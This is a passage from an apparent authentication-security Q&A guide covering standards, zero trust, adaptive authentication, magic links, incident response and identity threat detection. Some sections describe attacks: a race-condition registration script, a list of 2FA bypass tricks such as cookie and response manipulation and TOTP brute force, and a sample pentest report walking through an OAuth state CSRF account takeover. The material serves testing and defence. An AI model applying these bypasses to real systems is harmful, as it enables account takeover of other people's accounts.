    user.password_changed_at = datetime.now()
    user.save()
    
    # 8. Invalidate ALL sessions except current
    Session.objects.filter(user=user).exclude(id=request.session.id).delete()
    
    # 9. Invalidate refresh tokens
    RefreshToken.objects.filter(user=user).update(revoked_at=datetime.now())
    
    # 10. Notify
    send_email(user.email, "Password Changed",
              f"Changed at {datetime.now()} from {request.ip}")
    
    # 11. Log
    log_auth_event(user, 'password_changed')
    
    return success("Password changed")
```

### Q65: NIST 800-63B vs OWASP ASVS
**A:**

**NIST 800-63B (US gov standard):**
- 3 Authenticator Assurance Levels (AAL1, AAL2, AAL3)
- AAL1: Single factor, password OK
- AAL2: Two factors (something you know + have)
- AAL3: Two factors with hardware-based crypto

**OWASP ASVS (industry standard):**
- 3 verification levels
- L1: Basic - opportunistic
- L2: Standard - most apps
- L3: Advanced - high-value

**Comparison:**

| Requirement | NIST | OWASP ASVS |
|-------------|------|------------|
| Password min length | 8 | 12 (L2) |
| Complexity | Not required | Length-based |
| Breach check | Required | Required |
| 90-day rotation | Discouraged | Discouraged |
| MFA recommendation | Strong (AAL2+) | Required for sensitive |
| TOTP allowed | Yes | Yes |
| SMS allowed | Discouraged | Discouraged |
| WebAuthn | Recommended (AAL3) | Recommended |

**Use both:** NIST for US gov compliance, ASVS for application security baseline.

### Q66: Zero-trust architecture authentication
**A:**

**Principles:**
1. Never trust, always verify - Every request authenticated
2. Least privilege - Minimal access
3. Assume breach - Design for compromise
4. Verify explicitly - Multiple signals

**Per-request authentication:**

Traditional: Login once → trust for session.
Zero-trust: Every request → verify identity, context, device.

**Continuous verification:**
```python
def authenticate_request(request):
    user = verify_token(request.token)
    if not user:
        return DENY
    
    risk_score = calculate_risk_score(
        user=user,
        device=request.device,
        location=request.geolocation,
        behavior=request.behavior,
        time=request.timestamp
    )
    
    if risk_score > HIGH_RISK_THRESHOLD:
        return REQUIRE_REAUTHENTICATION
    if risk_score > MEDIUM_RISK_THRESHOLD:
        return REQUIRE_MFA
    return ALLOW
```

**Device trust:**
```python
def check_device_trust(device):
    return all([
        device.is_managed,
        device.is_compliant,
        device.is_healthy,
        device.is_recent
    ])
```

**Identity-aware proxy** (Google BeyondCorp, Cloudflare Zero Trust):
```
[User] → [IAP] → [App]
         Verify: authenticated, authorized, device trusted, context appropriate
```

**Just-in-time access** - Admin needs access → request → time-limited grant. No standing permissions.

### Q67: Adaptive authentication
**A:**

**Risk signals:**

1. **User context** - Login time vs pattern, frequency anomaly, sensitive action
2. **Device context** - Known/new, hygiene (OS, patches), jailbroken/rooted
3. **Location context** - IP geolocation, impossible travel, country risk, Tor/VPN/proxy
4. **Network context** - Corporate vs public, ASN reputation
5. **Behavioral biometrics** - Typing, mouse, touch gestures

**Implementation:**
```python
def calculate_risk_score(user, request):
    risk = 0
    if not is_known_device(user, request.device): risk += 20
    if not is_known_location(user, request.geo): risk += 15
    if is_unusual_time(user, request.timestamp): risk += 10
    if is_bad_ip(request.ip): risk += 30
    if is_tor_exit(request.ip): risk += 25
    if is_impossible_travel(user, request.geo): risk += 40
    if behavior_anomaly_score(user, request) > 0.7: risk += 20
    return min(risk, 100)

def adaptive_auth_decision(risk_score):
    if risk_score < 30: return "allow"
    elif risk_score < 60: return "require_mfa"
    elif risk_score < 80: return "require_strong_mfa"
    else: return "deny"
```

**UX:**
- Low risk: username/password only
- Medium: MFA via app
- High: MFA + email verification
- Very high: Block + manual review

### Q68: Machine-to-machine (M2M) authentication
**A:**

**Scenarios:** Microservice A → B, cron job → API, IoT → cloud, server-to-server integration.

**Methods:**

**1. API Keys** - `X-API-Key: pk_service_abc123`

**2. OAuth Client Credentials:**
```
POST /oauth/token
{"grant_type": "client_credentials", "client_id": "service_a", "client_secret": "secret"}
```

**3. JWT signed by service:**
```javascript
const token = jwt.sign({
    sub: 'service_a',
    aud: 'service_b',
    iat: now,
    exp: now + 300
}, privateKey, { algorithm: 'RS256' });
```

**4. mTLS (most secure)** - Both sides cryptographically authenticated via certs.

**5. Cloud IAM (AWS/Azure/GCP)** - Service uses IAM role, credentials auto-provided.

**6. SPIFFE/SPIRE** - Service identity standard, automatic SVID issuance.

**Best practices:**
1. Unique credentials per service
2. Short-lived (rotate frequently)
3. Minimum permissions
4. No credentials in code (use secret managers)
5. mTLS for sensitive
6. Audit logging
7. Network segmentation
8. Anomaly monitoring

### Q69: Business logic auth bypass
**A:**

**Examples:**

**1. Race conditions in registration** - 10 simultaneous requests bypass uniqueness check:
```python
async def race_register(session, email):
    return await session.post('/register', data={'email': email, 'password': 'test'})

# 20 concurrent requests
tasks = [race_register(session, 'admin@example.com') for _ in range(20)]
```

**2. Email change without re-auth** - Change email → trigger password reset to new email → takeover.

**3. Phone change without verification** - Same pattern for SMS-based 2FA.

**4. Skip 2FA step:**
```
Step 1: POST /login → "requires_2fa: true"
Step 2: Test POST /dashboard directly → access granted?
```

**5. Backup code abuse** - Not hashed, not invalidated after use, predictable.

**6. Account recovery bypass** - Security questions with public answers (LinkedIn, genealogy sites).

**7. Concurrent session abuse** - Logout from one device shouldn't kill others (if policy allows).

**8. Pre-authenticated endpoints** - `/setup`, `/onboarding`, `/welcome` sometimes accessible.

**9. JWT vulnerabilities** (covered in Part 6)

**10. OAuth state manipulation** - Hijack victim's flow with attacker's code.

### Q70: Authentication monitoring metrics
**A:**

**Key metrics:**

1. **Login success rate** - successful/total, alert <80%
2. **Failed login rate** - per minute, alert >100/min
3. **Account lockouts** - per hour, alert >50
4. **Password reset frequency** - per user, alert >5/month
5. **MFA adoption rate** - goal >90%
6. **Session duration** - alert >24 hours (timeout broken?)
7. **New device logins** - spike = potential breach
8. **Geographic distribution** - new country with volume
9. **API key usage** - per minute, anomaly detection
10. **Token refresh failures** - high rate = theft detection?

**Dashboard:**
```
Active Users: 45,231
Active Sessions: 12,453
Login Rate: 234/min
Failed Rate: 12/min
Login Success: 95.3%
MFA Usage: 87%
Suspicious Activity: 3 alerts active
```

### Q71: Authentication code review checklist
**A:**

**Password handling:**
- [ ] Bcrypt/Argon2/scrypt hashing
- [ ] Unique salt per password
- [ ] No plaintext passwords in code/logs
- [ ] Strong password validation
- [ ] Breached password check

**Session management:**
- [ ] Cryptographically secure session IDs
- [ ] Regeneration on login
- [ ] Invalidation on logout
- [ ] Idle and absolute timeouts
- [ ] HttpOnly, Secure, SameSite cookies

**Authentication flow:**
- [ ] Rate limiting
- [ ] No username enumeration
- [ ] Constant-time comparison
- [ ] Failed attempt tracking

**Password reset:**
- [ ] Secure token generation
- [ ] Expiration
- [ ] Single-use
- [ ] Tokens hashed in DB
- [ ] Session invalidation on reset

**MFA:**
- [ ] Properly enforced
- [ ] Backup codes hashed
- [ ] One-time use
- [ ] No bypass paths

**Authorization:**
- [ ] All endpoints check auth
- [ ] Role/permission checks
- [ ] IDOR prevention
- [ ] No client-side only checks

**Token management:**
- [ ] Secure storage (HttpOnly cookies)
- [ ] Expiration
- [ ] Rotation
- [ ] Revocation mechanism

**Security headers:**
- [ ] HTTPS enforced
- [ ] HSTS
- [ ] CSP
- [ ] X-Frame-Options

### Q72: Large-scale authentication architecture (100M+ users)
**A:**

```
[Edge/CDN] → [LB] → [API Gateway (regions)] → [Auth Service]
                                                    ↓
                                            [User Store (Postgres)]
                                            [Token Store (Redis)]
                                            [Audit Logs (Elastic)]
```

**Components:**

1. **CDN/Edge** - Cloudflare/Akamai, DDoS, WAF, bot mitigation
2. **API Gateway** - Rate limiting, auth validation, routing, logging
3. **Auth Service** - Stateless, horizontally scalable microservice
4. **User Store** - Postgres with replicas, sharded by user_id, encryption at rest
5. **Token Store** - Redis cluster, in-memory, replicated, TTLs
6. **Audit Logs** - Elasticsearch, long retention, searchable

**Performance:**
- Login: <200ms p99
- Token validation: <5ms p99
- Throughput: 100K+ req/sec
- Availability: 99.99%+

### Q73: GitHub-style authentication system
**A:**

**Features:** Username/password, PATs, OAuth apps, GitHub Apps, SSO, mandatory 2FA, webhook signatures, deploy keys, workflow secrets.

**Multi-tier auth:**
```python
def authenticate_request(request):
    if auth := try_session_cookie(request):
        return AuthContext(auth.user, 'password', ['*'], 'user')
    if auth := try_personal_access_token(request):
        return AuthContext(auth.user, 'pat', auth.scopes, 'user')
    if auth := try_oauth_token(request):
        return AuthContext(auth.user, 'oauth', auth.scopes, 'app')
    if auth := try_ssh_key(request):
        return AuthContext(auth.user, 'ssh', ['repo'], 'user')
    if auth := try_webhook_signature(request):
        return AuthContext(None, 'webhook', [], 'app')
    return AuthContext(None, 'anonymous', [], 'unauthenticated')
```

**Personal Access Tokens:**
```python
def create_pat(user, scopes, expires_in_days=90):
    token = f"ghp_{secrets.token_urlsafe(32)}"
    PersonalAccessToken.objects.create(
        user=user,
        token_hash=hash(token),
        token_prefix=token[:12],
        scopes=scopes,
        expires_at=datetime.now() + timedelta(days=expires_in_days)
    )
    return token  # Show once
```

**Scopes:** repo, repo:status, read:org, write:packages, gist, notifications, user, delete_repo, admin:org

**Webhook signatures:**
```python
def verify_webhook(request, secret):
    signature = request.headers.get('X-Hub-Signature-256').split('=')[1]
    expected = hmac.new(secret.encode(), request.body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(signature, expected)
```

### Q74: Federated auth breach scenario
**A:**

**Scenario: SSO/IdP breach**

Initial breach: Attacker compromises company's IdP (Okta, OneLogin) - admin access or super admin compromise.

Cascade impact: ALL connected apps potentially compromised - Email (Office 365), files (Box, Dropbox), support (Zendesk), code (GitHub), internal apps, financial systems.

**Real example: Okta breach 2022:**
- Attacker compromised support engineer's laptop
- ~366 customers affected
- Tier-1 corporations had to investigate impact

**Defense:**

1. **IdP hardening** - MFA for IdP admins (hardware token), strict access, detailed audit logging

2. **Conditional access** - Device trust required, location restrictions, compliance checks

3. **Privileged Access Management** - Just-in-time admin, approval workflows, time-limited grants

4. **Defense in depth** - Application-level MFA, sensitive ops require fresh auth

5. **Monitoring** - Unusual IdP activity, new device alerts, admin action alerts

6. **Incident response plan** - IdP compromise scenarios, force re-auth all users, audit sessions, rotate secrets

### Q75: Microservices session - JWT vs Session comparison
**A:**

**JWT-based:**
```
[User] → [Gateway] → [Service A] → [Service B] → [Service C]
                       Each verifies JWT independently
```
Pros: Stateless, no DB calls, easy scaling. Cons: Hard to revoke, size overhead, shared keys.

**Session-based:**
```
[User] → [Gateway] → [Auth Service] → backends with X-User-Id header
```
Pros: Easy revocation, smaller, central control, audit trail. Cons: Central failure point, network call.

**Hybrid:**
- User has JWT
- Services have their own JWTs for inter-service auth
- Different tokens for different trust boundaries

**Decision factors:**

| Factor | JWT | Session |
|--------|-----|---------|
| Scale | High | Medium |
| Revocation | Bad | Good |
| Cross-region | Good | Awkward |
| Mobile | Good | OK |
| Audit | Hard | Easy |
| Compliance | Hard | Easier |

### Q76: Authentication during security incident
**A:**

**Phase 1: Initial response (0-1 hour)**

1. Assess scope - which users, systems, data?
2. Contain - block compromised accounts, isolate systems
3. Communicate - security team, leadership, legal

**Phase 2: Investigation (1-24 hours)**

1. Forensics - log analysis, timeline construction
2. Identify attack vector
3. Determine data accessed
4. Identify other compromised accounts

**Phase 3: Recovery (24-72 hours)**

1. Force password reset for affected users
2. Invalidate all sessions:
```python
def emergency_invalidate_sessions(affected_user_ids):
    Session.objects.filter(user_id__in=affected_user_ids).delete()
    RefreshToken.objects.filter(user_id__in=affected_user_ids).update(revoked=True)
```

3. Rotate API keys and tokens
4. Force 2FA enablement
5. Monitor closely

**Phase 4: Notification (72 hours)**

GDPR/CCPA require notification within 72 hours for breach.

```
Subject: Important security notice

We recently identified unauthorized access to your account. 
Please:
1. Change your password
2. Enable 2FA if not already
3. Review recent activity
4. Contact support if you see suspicious activity
```

**Phase 5: Post-incident**

1. Root cause analysis
2. Implement fixes
3. Update incident response playbook
4. Security training
5. Regular pentest
6. Compliance reporting

### Q77: 2FA bypass techniques and testing
**A:**

**Common bypass methods:**

**1. Skip 2FA step:**
- After password, access dashboard directly without entering code
- Some apps don't enforce completion

**2. Response manipulation:**
```
Response: {"requires_2fa": true}
Modify to: {"requires_2fa": false}
```
Some clients trust this.

**3. Race condition:**
- Submit 2FA code while login token still valid
- Bypass via concurrent requests

**4. Backup code abuse:**
- Predictable backup codes
- Not invalidated after use
- Same codes across users

**5. Phone/Email change bypass:**
- Change phone number → 2FA via SMS
- New phone now receives codes

**6. Session reuse:**
- Old "2FA-passed" session reused
- Without re-verification

**7. Cookie manipulation:**
```
Cookie: 2fa_verified=false → 2fa_verified=true
```

**8. Brute force TOTP:**
- 6 digits = 1M combinations
- No rate limit = brute force possible

**9. Time desync:**
- Set device time to past
- Use old code

**10. Recovery flow abuse:**
- "Lost phone" recovery
- Verify via email only
- Email compromise = 2FA bypass

### Q78: Hardware token authentication (YubiKey, FIDO2)
**A:**

**YubiKey types:**
- YubiKey 5 NFC - USB-A + NFC
- YubiKey 5C - USB-C
- YubiKey Bio - With fingerprint
- Security Key NFC - FIDO2 only

**Capabilities:**
1. **FIDO2/WebAuthn** - Modern passwordless auth
2. **OATH-TOTP** - Stores TOTP secrets
3. **PIV (Smart card)** - Cert-based auth
4. **OpenPGP** - Email signing/encryption
5. **OTP (Yubico OTP)** - Legacy one-time passwords
6. **Static password** - Stored password output

**FIDO2/WebAuthn flow:**

1. Browser requests authentication
2. YubiKey receives challenge
3. User touches YubiKey (presence proof)
4. YubiKey signs challenge with private key
5. Browser sends signature
6. Server verifies

**Benefits:**
- Phishing-resistant (origin-bound signatures)
- No shared secrets transmitted
- No batteries
- Multiple sites with same key
- Compact, durable

**Limitations:**
- Lost key = recovery needed
- Cost ($25-70 per key)
- Not all sites support
- Mobile use requires NFC or USB-C

**Best practice:** Buy 2 keys - primary + backup. Register both on important accounts.

### Q79: Authentication in serverless architectures
**A:**

**Challenges:**
- No persistent connections
- Cold starts
- Stateless by design
- Limited execution time

**Patterns:**

**1. JWT validation in each function:**
```python
def lambda_handler(event, context):
    token = event['headers'].get('Authorization', '').replace('Bearer ', '')
    
    try:
        payload = jwt.decode(token, public_key, algorithms=['RS256'])
        user_id = payload['sub']
        # Process request
    except jwt.InvalidTokenError:
        return {'statusCode': 401, 'body': 'Unauthorized'}
```

**2. API Gateway authorizers:**
- Lambda authorizer validates before backend
- Caches authorization decisions
- Backend trusts gateway-passed user info

**3. AWS Cognito integration:**
- Managed user pools
- Federated identity
- JWT issuance
- Built-in MFA

**4. Identity propagation:**
```python
# Pass user context as Lambda environment
@app.route('/api/data')
def get_data():
    user_id = request.headers.get('X-User-Id')  # From authorizer
    # Process
```

**5. Secrets management:**
- Don't hardcode credentials
- Use AWS Secrets Manager, Parameter Store
- IAM role-based access

**Best practices:**
- Short-lived tokens (cold start friendly)
- Stateless validation (no DB lookups)
- Caching at gateway level
- IAM for service-to-service
- WAF in front

### Q80: Modern authentication trends 2026
**A:**

**1. Passwordless adoption** - Passkeys, WebAuthn, biometrics becoming standard

**2. Passkeys mainstream** - Apple, Google, Microsoft sync, cross-device QR pairing

**3. Continuous authentication** - Behavioral biometrics, ongoing verification

**4. Zero-trust spreading** - Beyond perimeter, every request verified

**5. AI-assisted detection** - ML for anomaly detection, automated response

**6. Decentralized identity (DID)** - Blockchain-based, user-owned identity

**7. Quantum-resistant crypto** - NIST PQC standards, preparing for quantum

**8. Privacy-preserving auth** - Zero-knowledge proofs, minimal data exposure

**9. SCIM ubiquity** - Cross-system provisioning standard

**10. Biometric template protection** - Cancellable biometrics, secure enclaves

**11. Regulatory pressure** - GDPR, CCPA, more privacy laws

**12. Deepfake risks** - Voice/face biometrics under attack from AI-generated content

**Career implications:**
- Authentication knowledge always relevant
- Specialize in IAM, IDaaS
- Cloud-native auth (Cognito, Auth0, Okta)
- Identity threat detection growing
- Compliance expertise valuable

### Q81: Email-based authentication (magic links)
**A:**

**Magic link** = Passwordless auth via email link.

**Flow:**
1. User enters email
2. Server generates one-time token
3. Email sent with link: `https://app.com/login?token=xyz`
4. User clicks → logged in

**Implementation:**
```python
@app.route('/request-magic-link', methods=['POST'])
def request_magic_link():
    email = request.form['email']
    user = User.objects.filter(email=email).first()
    
    if user:
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        
        MagicLinkToken.objects.create(
            user=user,
            token_hash=token_hash,
            expires_at=datetime.now() + timedelta(minutes=15)
        )
        
        link = f"https://app.com/magic-login?token={token}"
        send_email(user.email, "Login link", f"Click: {link}")
    
    return jsonify({"message": "If account exists, link sent"})

@app.route('/magic-login')
def magic_login():
    token = request.args.get('token')
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    magic = MagicLinkToken.objects.filter(
        token_hash=token_hash,
        expires_at__gt=datetime.now(),
        used=False
    ).first()
    
    if not magic:
        return redirect('/login?error=invalid')
    
    # Mark used
    magic.used = True
    magic.save()
    
    # Create session
    create_session(magic.user)
    return redirect('/dashboard')
```

**Pros:**
- No password to remember
- Phishing harder (must access email)
- Good UX

**Cons:**
- Email account compromise = takeover
- Email delivery delays
- Email interception
- Slack/email previews can leak

**Best practices:**
- Short expiration (15 min)
- One-time use
- Token hashed in DB
- Notify user of login
- Optional: Require email + password

### Q82: Risk-based authentication implementation
**A:**

**Risk factors and scoring:**

```python
def calculate_risk(user, request):
    risk = 0
    
    # Device risk
    if not is_known_device(user, request.device_fingerprint):
        risk += 25
    if request.device.is_jailbroken or request.device.is_rooted:
        risk += 30
    
    # Location risk
    if request.country not in user.usual_countries:
        risk += 15
    if is_high_risk_country(request.country):
        risk += 20
    if is_impossible_travel(user, request):
        risk += 50
    
    # Network risk
    if is_tor_exit(request.ip):
        risk += 30
    if is_vpn(request.ip):
        risk += 10
    if is_proxy(request.ip):
        risk += 15
    
    # Behavioral risk
    if is_unusual_time(user, request.timestamp):
        risk += 10
    if behavior_anomaly(user, request) > 0.7:
        risk += 25
    
    # Account risk
    if user.recently_changed_password():
        risk += 5
    if user.recent_failed_logins > 3:
        risk += 15
    
    return min(risk, 100)

def auth_decision(risk_score, operation):
    if operation == 'login':
        if risk_score < 30: return AuthLevel.PASSWORD
        elif risk_score < 60: return AuthLevel.MFA
        elif risk_score < 80: return AuthLevel.MFA_HARDWARE
        else: return AuthLevel.BLOCK
    
    if operation == 'financial_transaction':
        if risk_score < 20: return AuthLevel.PASSWORD
        elif risk_score < 50: return AuthLevel.MFA
        else: return AuthLevel.MFA_HARDWARE
```

**Continuous risk evaluation:**
- Track risk score throughout session
- Increase scrutiny as risk grows
- Auto-logout if score exceeds threshold

### Q83: Single sign-out (SSO logout)
**A:**

**Problem:** User logs out from one app, but other federated apps still have active sessions.

**SAML Single Logout (SLO):**

```
1. User clicks logout in App A
2. App A redirects to IdP with LogoutRequest
3. IdP determines all apps user logged into
4. IdP sends LogoutRequest to each app
5. Each app destroys session, returns LogoutResponse
6. IdP redirects user back to App A with confirmation
```

**Front-channel SLO:**
- Browser redirects through each app
- User sees series of redirects
- Slower, more fragile

**Back-channel SLO:**
- IdP makes server-to-server calls to each app
- Faster, more reliable
- Requires apps to expose endpoints

**OIDC Front-Channel Logout:**

```
1. User clicks logout
2. App redirects to IdP /end_session
3. IdP shows logout page with iframes
4. Each iframe loads RP's frontchannel_logout_uri
5. RP destroys session in response
```

**Issues:**
- Not all apps support SLO
- Network failures = inconsistent state
- User confused by multiple redirects
- Back-channel can be unreliable

**Best practices:**
- Use back-channel where possible
- Clear cookies aggressively
- Notify user about other active sessions
- Provide "logout everywhere" option

### Q84: Authentication for B2B SaaS - enterprise SSO
**A:**

**Common B2B SSO requirements:**

1. **SAML 2.0 support** - Enterprise standard
2. **OIDC** - Modern alternative
3. **SCIM provisioning** - Auto user creation/deactivation
4. **Just-in-time (JIT) provisioning** - User created on first login
5. **Custom domain mapping** - Each tenant's IdP
6. **Group-based access** - Map IdP groups to app roles
7. **Audit logs** - Compliance reporting

**Implementation considerations:**

**Multi-tenancy:**
```python
class Tenant(models.Model):
    name = CharField()
    domain = CharField(unique=True)
    sso_enabled = BooleanField()
    sso_provider = CharField()  # 'saml', 'oidc'
    saml_metadata = TextField()
    oidc_issuer = CharField()
    oidc_client_id = CharField()
    oidc_client_secret = CharField()

class User(models.Model):
    tenant = ForeignKey(Tenant)
    email = EmailField()
    sso_subject = CharField()  # From IdP
```

**Login flow:**
```python
def login(email, password):
    # Determine tenant from email domain
    domain = email.split('@')[1]
    tenant = Tenant.objects.filter(domain=domain).first()
    
    if tenant and tenant.sso_enabled:
        # Redirect to IdP
        return redirect_to_sso(tenant)
    else:
        # Standard password auth
        return password_auth(email, password)
```

**SCIM endpoint** (for IdP provisioning):
```python
@app.route('/scim/v2/Users', methods=['POST'])
@require_scim_auth
def scim_create_user():
    data = request.json
    user = User.objects.create(
        tenant=request.tenant,
        email=data['userName'],
        active=data.get('active', True)
    )
    return scim_response(user)
```

**Pricing tiers:**
- Free/Starter: Password only
- Pro: 2FA
- Business: SSO (SAML)
- Enterprise: SAML + SCIM + Audit logs

### Q85: Mobile app authentication best practices
**A:**

**1. OAuth Authorization Code + PKCE:**
- Not Implicit grant
- Not Resource Owner Password
- Use native browser (SFSafariViewController/Chrome Custom Tabs)
- Never embedded WebView

**2. Secure storage:**
- iOS: Keychain Services
- Android: EncryptedSharedPreferences or Keystore
- Never AsyncStorage/UserDefaults plain

**3. Biometric integration:**
- Touch ID / Face ID (iOS)
- BiometricPrompt (Android)
- Always with password fallback

**4. Certificate pinning:**
- Prevent MITM
- Pin to specific certs or CA

**5. App attestation:**
- iOS App Attest
- Android Play Integrity API
- Verify app legitimacy server-side

**6. Jailbreak/Root detection:**
- Don't allow auth on compromised devices
- Multiple detection layers
- Server-side checks

**7. Session management:**
- Short access tokens
- Refresh tokens in secure storage
- Auto-logout on backgrounding (sensitive apps)
- App lock with PIN/biometric

**8. Push notification security:**
- Don't include sensitive data in notifications
- Encrypt sensitive payloads
- Use notification IDs that map to server data

**9. Anti-tampering:**
- Code obfuscation
- Anti-debugging
- Integrity checks
- Anti-reverse engineering tools (DexGuard, etc.)

**10. Device binding:**
- Generate device-specific keys
- Server tracks device fingerprints
- Detect token use from different device

### Q86: How to test authentication for OWASP ASVS L2 compliance
**A:**

**ASVS Level 2 authentication tests:**

**V2.1 Password security:**
- [ ] V2.1.1: Passwords 12+ characters
- [ ] V2.1.2: 64+ characters allowed
- [ ] V2.1.3: Unicode supported
- [ ] V2.1.7: Breached password check
- [ ] V2.1.8: Complexity not enforced (length-based)
- [ ] V2.1.9: No password rotation policy
- [ ] V2.1.10: No password hints
- [ ] V2.1.11: "Show password" option
- [ ] V2.1.12: Password paste allowed

**V2.2 General authenticator security:**
- [ ] V2.2.1: Anti-automation controls
- [ ] V2.2.2: Weak authenticators not used (SMS)
- [ ] V2.2.3: User notified after auth events

**V2.3 Authenticator lifecycle:**
- [ ] V2.3.1: Random initial passwords
- [ ] V2.3.2: Authenticator enrollment is secure
- [ ] V2.3.3: Renewal/recovery processes secure

**V2.4 Credential storage:**
- [ ] V2.4.1: Argon2/PBKDF2/bcrypt/scrypt
- [ ] V2.4.3: PBKDF2 if used: 100K+ iterations
- [ ] V2.4.4: bcrypt if used: cost factor 10+
- [ ] V2.4.5: Salt 32+ bits per password

**V2.5 Credential recovery:**
- [ ] V2.5.1: Initial passwords not weak
- [ ] V2.5.2: System credentials not in source code
- [ ] V2.5.3: Recovery doesn't reveal current password
- [ ] V2.5.4: Default passwords don't exist
- [ ] V2.5.5: Recovery via random new password OR soft token
- [ ] V2.5.6: Magic links/OTP via separate channel
- [ ] V2.5.7: Recovery OTPs time-limited

**V2.7 Out of band authenticator:**
- [ ] V2.7.1: Plaintext OOB authenticators (SMS) not used for sensitive
- [ ] V2.7.2: OOB authenticator delivery encrypted
- [ ] V2.7.3: OOB authenticators expire in minutes

**V2.8 One-time verifier:**
- [ ] V2.8.1: TOTP time-step 30s
- [ ] V2.8.2: HOTP/TOTP secrets unique per user
- [ ] V2.8.3: Random keys (~128 bits)

**V2.9 Cryptographic verifier:**
- [ ] V2.9.1: Cryptographic keys safely stored

**V2.10 Service authentication:**
- [ ] V2.10.1: Inter-service secrets not in plain
- [ ] V2.10.2: Service accounts non-default passwords
- [ ] V2.10.3: Passwords stored with sufficient protection
- [ ] V2.10.4: Cryptographic keys not stored in source code

### Q87: AWS IAM authentication best practices
**A:**

**Principles:**

**1. Root account:**
- Never use for daily operations
- Enable hardware MFA
- Delete access keys
- Use only for billing, account closure

**2. IAM users:**
- One per human
- Strong passwords + MFA mandatory
- Limited permissions
- Regular access reviews

**3. IAM roles (preferred):**
- Service-to-service auth
- EC2 instance profiles
- Lambda execution roles
- Cross-account access

**4. Principle of least privilege:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::specific-bucket/specific-prefix/*"
    }
  ]
}
```

**5. STS for temporary credentials:**
```python
sts = boto3.client('sts')
response = sts.assume_role(
    RoleArn='arn:aws:iam::123456789:role/MyRole',
    RoleSessionName='session-name',
    DurationSeconds=3600
)
# Use response['Credentials'] for limited time
```

**6. Federated access:**
- SAML 2.0 for enterprise
- AWS SSO for centralized
- Identity providers (Okta, Azure AD, Google Workspace)

**7. Multi-account strategy:**
- Separate accounts per environment
- Cross-account roles for access
- AWS Organizations for governance

**8. Service control policies (SCPs):**
- Organization-wide restrictions
- Cannot be overridden by IAM
- Defense in depth

**9. Access analyzer:**
- Identify public/external access
- Validate policies
- Find unused permissions

**10. Logging:**
- CloudTrail for all API calls
- Long-term retention
- Anomaly detection

### Q88: Authentication architecture for SaaS startup
**A:**

**Phase 1: MVP (0-1000 users)**

Use managed service:
- Auth0
- AWS Cognito
- Firebase Auth
- Supabase Auth
- Clerk

```javascript
// Clerk example
import { SignIn } from '@clerk/nextjs';

export default function SignInPage() {
  return <SignIn routing="path" path="/sign-in" />;
}
```

Pros: Fast to implement, secure defaults, SOC 2 compliant.
Cons: Cost scales, vendor lock-in.

**Phase 2: Growth (1K-100K users)**

Continue with managed, add:
- 2FA enforcement
- SSO for enterprise customers
- Audit logging
- Compliance prep (SOC 2)

**Phase 3: Scale (100K+ users)**

Consider migration:
- Build custom for cost savings
- Or stay with managed for reliability
- Hybrid: Custom for users, managed for SSO

**Phase 4: Enterprise**

Required:
- SAML SSO
- SCIM provisioning
- Custom domain mapping
- Audit log export
- Compliance certifications (SOC 2, ISO 27001, HIPAA, PCI)

**Decision factors:**
- Engineering capacity
- Compliance requirements
- Cost at scale
- Feature requirements
- Integration needs

### Q89: Penetration testing report for authentication finding
**A:**

**Sample report:**

```markdown
# Critical Authentication Bypass via OAuth State Parameter Manipulation

## Severity: Critical
## CVSS 3.1: 9.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

## Summary
The OAuth callback endpoint does not validate the state parameter, 
enabling attackers to perform CSRF attacks during the OAuth flow,
resulting in account takeover.

## Affected Component
- Endpoint: GET /oauth/google/callback
- Parameter: state, code
- Authentication: Required (in OAuth flow)

## Description
When users authenticate via Google OAuth, the application receives 
an authorization code in the callback. The state parameter is not 
validated against the user's session, allowing an attacker to 
hijack the OAuth flow.

## Proof of Concept

### Step 1: Attacker initiates OAuth flow
GET /oauth/google
Cookie: SESSION=attacker_session
Response: Redirect to Google with code=ATTACKER_CODE&state=ATTACKER_STATE

### Step 2: Attacker doesn't complete - extracts callback URL
Callback URL: https://app.com/oauth/google/callback?code=ATTACKER_CODE&state=ATTACKER_STATE

### Step 3: Victim clicks attacker's link (phishing, ad, etc.)
GET /oauth/google/callback?code=ATTACKER_CODE&state=ATTACKER_STATE
Cookie: SESSION=victim_session

### Step 4: App exchanges ATTACKER_CODE for attacker's Google account
Victim's session is now linked to attacker's Google account.

### Step 5: Attacker logs in via "Sign in with Google"
Their Google account is now associated with victim's app account.
Attacker has access to all victim's data.

## Impact
- Account takeover via social engineering
- Victims unaware of compromise
- Persistent access (until OAuth disconnected)
- Affects all OAuth users (50K+ accounts)

## Remediation

### Immediate
Implement state parameter validation:

```python
def oauth_callback():
    received_state = request.args.get('state')
    expected_state = request.session.get('oauth_state')
    
    if not received_state or received_state != expected_state:
        return error("Invalid OAuth state")
    
    # Continue with code exchange
```

### Long-term
1. Audit all OAuth flows
2. Implement PKCE for additional protection
3. Add CSRF tokens to OAuth flows
4. Security training on OAuth specifics

## References
- OAuth 2.0 Security Best Practice
- CWE-352: Cross-Site Request Forgery
- OWASP API Security Top 10

## Timeline
- Discovered: 2026-06-01
- Reported: 2026-06-01 09:30 UTC
- Fix deployed: 2026-06-02 14:00 UTC
- Verified: 2026-06-02 16:00 UTC
```

### Q90: Identity threat detection - what to monitor
**A:**

**Detection categories:**

**1. Brute force / credential stuffing:**
- Multiple failed logins same user
- Multiple failed logins from same IP
- Distributed attempts (many IPs, low rate)
- Common password lists detected

**2. Account takeover indicators:**
- Login from new country
- Login from new device
- Impossible travel
- Unusual time of access
- Sudden behavior change

**3. Privilege escalation:**
- Role changes
- Permission grants
- Admin actions by non-admin users
- Bypass attempts

**4. Insider threats:**
- Bulk data access
- After-hours activity
- Access to data outside job function
- Excessive privileges accumulating

**5. Compromised credentials:**
- Login from Tor/VPN unusual for user
- Multiple concurrent sessions from different locations
- Credential reuse across services
- HIBP API checks

**6. Session anomalies:**
- Long-lived sessions
- Sessions from multiple IPs
- Unusual API call patterns
- Token replay attempts

**7. MFA bypass attempts:**
- Multiple MFA failures
- Recovery code usage
- Phone number changes
- Authenticator app changes

**Tools:**
- **Microsoft Sentinel** - SIEM with identity focus
- **Azure AD Identity Protection** - Built-in detection
- **Okta ThreatInsight** - Cross-tenant threat detection
- **Splunk UBA** - User behavior analytics
- **Exabeam** - Identity-focused SIEM
- **CrowdStrike Falcon Identity** - Threat hunting

**Response automation:**
- Auto-block suspicious IPs
